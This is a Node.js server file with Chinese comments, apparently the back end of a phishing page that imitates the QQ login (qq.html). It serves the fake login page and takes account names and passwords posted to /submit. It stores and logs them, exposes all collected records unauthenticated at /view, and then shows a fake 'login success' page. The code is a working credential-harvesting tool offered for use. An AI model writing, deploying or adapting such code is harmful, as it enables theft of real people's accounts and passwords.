const http = require('http');
const fs = require('fs');
const path = require('path');

// 存储所有提交的账号密码
let receivedData = [];

const server = http.createServer((req, res) => {
    // 1. 首页：显示登录页 qq.html
    if (req.url === '/' || req.url.startsWith('/qq.html')) {
        const filePath = path.join(__dirname, 'qq.html');
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404, { 'Content-Type': 'text/html;charset=utf-8' });
                res.end('<h1>找不到 qq.html 文件，请检查文件名</h1>');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html;charset=utf-8' });
            res.end(data);
        });
    }
    // 2. 主页：显示登录成功页 qq主页.html（支持带 ?user=xxx&pwd=xxx 参数）
    else if (req.url.startsWith('/success.html')) {
        const filePath = path.join(__dirname, 'success.html');
        fs.readFile(filePath, (err, data) => {
            if (err) {
                res.writeHead(404, { 'Content-Type': 'text/html;charset=utf-8' });
                res.end(`
<!DOCTYPE html>
<html>
<head><title>404</title></head>
<body style="background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:微软雅黑;">
    <div style="background:white;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center;">
        <h1 style="color:#ff4d4f;">404 找不到页面</h1>
        <p style="color:#666;">请检查 success.html 是否在文件夹里</p>
        <a href="/" style="display:inline-block;margin-top:20px;padding:10px 20px;background:#1677ff;color:white;border-radius:6px;text-decoration:none;">返回登录</a>
    </div>
</body>
</html>
                `);
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html;charset=utf-8' });
            res.end(data);
        });
    }
    // 3. 接收数据接口：前端提交账号密码到这里
    else if (req.url === '/submit' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk;
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                receivedData.push(data);
                console.log('✅ 收到新数据：', data);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'ok' }));
            } catch (e) {
                res.writeHead(400);
                res.end(JSON.stringify({ status: 'error' }));
            }
        });
    }
    // 4. 查看数据页：http://localhost:3000/view 查看所有提交记录
    else if (req.url === '/view') {
        res.writeHead(200, { 'Content-Type': 'application/json;charset=utf-8' });
        res.end(JSON.stringify(receivedData, null, 2));
    }
    // 5. 其他地址：统一跳回登录页
    else {
        res.writeHead(404, { 'Content-Type': 'text/html;charset=utf-8' });
        res.end(`
<!DOCTYPE html>
<html>
<head><title>页面不存在</title></head>
<body style="background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:微软雅黑;">
    <div style="background:white;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);text-align:center;">
        <h1 style="color:#faad14;">页面走丢了 😅</h1>
        <p style="color:#666;">2秒后自动返回登录页</p>
        <meta http-equiv="refresh" content="2;url=/">
    </div>
</body>
</html>
        `);
    }
});

server.listen(3000, () => {
    console.log('🚀 服务器运行在：http://localhost:3000');
});